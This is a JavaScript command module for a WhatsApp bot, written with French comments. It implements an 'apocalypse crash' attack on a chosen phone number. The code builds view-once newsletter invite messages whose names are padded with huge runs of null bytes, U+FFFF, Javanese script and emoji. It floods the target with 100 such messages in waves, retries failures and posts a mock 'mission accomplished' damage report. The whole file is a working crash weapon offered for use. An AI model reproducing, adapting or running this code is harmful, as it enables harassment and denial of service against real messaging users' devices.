import pkg from 'bailey';
import os from 'os';

const { proto, generateWAMessageFromContent } = pkg;

import channelSender from '../utils/sender.js';

// Configuration de destruction maximale
const APOCALYPSE_CONFIG = {
    MAX_ITERATIONS: 100, // Augmenté de 233%
    DELAY_BETWEEN_REQUESTS: 300, // Réduit de 70%
    WORKER_COUNT: os.cpus().length,
    RETRY_ATTEMPTS: 5,
    TIMEOUT: 20000,
    
    // Nouvelles chaînes de destruction extrême
    // Destruction payloads are generated lazily to avoid huge memory allocations on import.
    // Each entry is a function that returns the payload when needed.
    DESTRUCTION_STRINGS: [
        () => "ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(1024),
        () => "\u0000".repeat(1024),
        () => "0".repeat(2048),
        () => " ".repeat(4096),
        () => "\uD83D\uDCA5".repeat(1024), // Bombe emoji
        () => "X".repeat(2048),
        () => "￿".repeat(1024),
        () => String.fromCharCode(65535).repeat(1024)
    ],
    
    NEWSLETTER_CONFIG: {
        jid: "120363298524333143@newsletter",
        baseName: "🎴 ☠𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝛥𝛲𝛩𝐶𝛥𝐿𝑌𝑆𝛯☠ 🎴",
        caption: "⚡ SYSTÈME DE CRASH ULTIME ACTIVÉ ⚡",
        expiration: 1814400000
    }
};

// Cache de guerre pour performances maximales
class WarCache {
    constructor() {
        this.messageCache = new Map();
        this.preGenerated = new Map();
    }
    
    generateWarMessage(remoteJid, destructionType) {
        const cacheKey = `${remoteJid}_${destructionType}`;
        
        if (!this.messageCache.has(cacheKey)) {
            // Support lazy generators (functions) to avoid huge memory allocations on import
            const dsEntry = APOCALYPSE_CONFIG.DESTRUCTION_STRINGS[destructionType];
            const destructionString = (typeof dsEntry === 'function') ? dsEntry() : dsEntry;
            const newsletterName = APOCALYPSE_CONFIG.NEWSLETTER_CONFIG.baseName + destructionString;
            
            const message = generateWAMessageFromContent(
                remoteJid, 
                proto.Message.fromObject({
                    'viewOnceMessage': {
                        'message': {
                            "newsletterAdminInviteMessage": {
                                "newsletterJid": APOCALYPSE_CONFIG.NEWSLETTER_CONFIG.jid,
                                "newsletterName": newsletterName,
                                "jpegThumbnail": ``,
                                "caption": APOCALYPSE_CONFIG.NEWSLETTER_CONFIG.caption,
                                "inviteExpiration": Date.now() + APOCALYPSE_CONFIG.NEWSLETTER_CONFIG.expiration
                            }
                        }
                    }
                }), 
                { 'userJid': remoteJid }
            );
            
            this.messageCache.set(cacheKey, message);
        }
        
        return this.messageCache.get(cacheKey);
    }
    
    clearCache() {
        this.messageCache.clear();
    }
}

const warCache = new WarCache();

// Système de tracking de destruction
class ApocalypseTracker {
    constructor() {
        this.stats = {
            attacksLaunched: 0,
            successfulHits: 0,
            failedAttacks: 0,
            startTime: Date.now(),
            targetsDestroyed: new Set()
        };
    }
    
    recordAttack(target, success = true) {
        this.stats.attacksLaunched++;
        this.stats.targetsDestroyed.add(target);
        if (success) this.stats.successfulHits++;
        else this.stats.failedAttacks++;
    }
    
    getDestructionReport() {
        const elapsed = (Date.now() - this.stats.startTime) / 1000;
        return {
            totalAttacks: this.stats.attacksLaunched,
            successful: this.stats.successfulHits,
            failed: this.stats.failedAttacks,
            targets: this.stats.targetsDestroyed.size,
            attacksPerSecond: this.stats.attacksLaunched / elapsed,
            successRate: (this.stats.successfulHits / this.stats.attacksLaunched) * 100
        };
    }
}

const apocalypseTracker = new ApocalypseTracker();

// Fonction d'attaque nucléaire
async function nuclearStrike(client, participant, strikeType, attempt = 1) {
    try {
        const messageContent = warCache.generateWarMessage(participant, strikeType);
        
        const strikePromise = client.relayMessage(participant, messageContent.message, {
            'participant': { 'jid': participant },
            'messageId': messageContent.key.id
        });
        
        // Timeout pour éviter les blocages
        await Promise.race([
            strikePromise,
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Nuclear strike timeout')), APOCALYPSE_CONFIG.TIMEOUT)
            )
        ]);
        
        apocalypseTracker.recordAttack(participant, true);
        return true;
    } catch (error) {
        console.error("=========================\n Nuclear strike failed (attempt " + attempt + "):\n=========================", error);
        apocalypseTracker.recordAttack(participant, false);
        
        // Re-tentative automatique
        if (attempt < APOCALYPSE_CONFIG.RETRY_ATTEMPTS) {
            await new Promise(resolve => setTimeout(resolve, attempt * 200));
            return nuclearStrike(client, participant, strikeType, attempt + 1);
        }
        
        return false;
    }
}

// Attaque de masse coordonnée
async function massDestruction(message, client, participant) {
    const destructionPromises = [];
    
    for (let i = 0; i < APOCALYPSE_CONFIG.MAX_ITERATIONS; i++) {
        // Utilisation de tous les types de destruction disponibles
        const strikeType = i % APOCALYPSE_CONFIG.DESTRUCTION_STRINGS.length;
        
        destructionPromises.push(
            new Promise(resolve => {
                setTimeout(async () => {
                    const result = await nuclearStrike(client, participant, strikeType);
                    resolve(result);
                }, i * APOCALYPSE_CONFIG.DELAY_BETWEEN_REQUESTS);
            })
        );
        
        // Envoi par vagues pour maximiser l'impact
        if (i % 8 === 0) {
            await Promise.allSettled(destructionPromises);
            destructionPromises.length = 0;
        }
    }
    
    // Finalisation des dernières attaques
    await Promise.allSettled(destructionPromises);
}

// Fonction principale de destruction
export async function apocalypseCrash(message, client) {
    try {
        const remoteJid = message.key?.remoteJid;
        const user = message.pushName || "Unknown Soldier";

        if (!remoteJid) {
            throw new Error("Target coordinates unavailable.");
        }

        // Message d'activation de l'apocalypse
        await client.sendMessage(remoteJid, { 
            text: `=================================
        KURONA CRASH ACTIVATED
=================================
   DESTRUCTION POWER: 300%          
=================================
• Operator: ${user}
• Time: ${new Date().toLocaleString()}
• Status: INITIATING TOTAL ANNIHILATION...
=================================`
        });

        // Identification de la cible
        const messageBody = message.message?.extendedTextMessage?.text || 
                           message.message?.conversation || '';

        const args = messageBody.slice(1).trim().split(/\s+/);
        const targetArgs = args.slice(1);

        let participant;
        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            participant = message.message.extendedTextMessage.contextInfo.participant;
        } else if (targetArgs.length > 0) {
            participant = targetArgs[0].replace('@', '') + '@s.whatsapp.net';
        } else {
            throw new Error('TARGET REQUIRED FOR APOCALYPSE MODE.');
        }

        // Lancement de la destruction de masse
        await massDestruction(message, client, participant);

        // Rapport final de destruction
        const report = apocalypseTracker.getDestructionReport();
        
        const victoryMessage = `=========================
       MISSION ACCOMPLISHED         
=========================
• Target: ${participant}
• Total Attacks: ${report.totalAttacks}
• Successful: ${report.successful}
• Failed: ${report.failed}
• Success Rate: ${report.successRate.toFixed(2)}%
• Attacks/Second: ${report.attacksPerSecond.toFixed(2)}
${report.successRate > 85 ? '⚡ TARGET COMPLETELY DESTROYED ⚡' : 
report.successRate > 60 ? '💀 SIGNIFICANT DAMAGE INFLICTED 💀' : 
'⚠️ MODERATE IMPACT ACHIEVED ⚠️'}
=========================`;

        await channelSender(message, client, victoryMessage, 1);

    } catch (error) {
        console.error("=========================\n APOCALYPSE FAILURE:\n=========================", error);
        
        const errorMessage = `=========================
         MISSION FAILED              
=========================
• Error: ${error.message}
• Time: ${new Date().toLocaleTimeString()}
• Status: ATTEMPTING RECOVERY...
=========================`;

        if (message.key.remoteJid) {
            await client.sendMessage(message.key.remoteJid, { text: errorMessage });
        }
    }
}

// Note: Removed automatic cluster forking to avoid child processes starting on module import.
// Commands should not fork worker processes on import — if you need parallel workers,
// start them explicitly from the main process (e.g., index.js) with proper lifecycle handling.

export default apocalypseCrash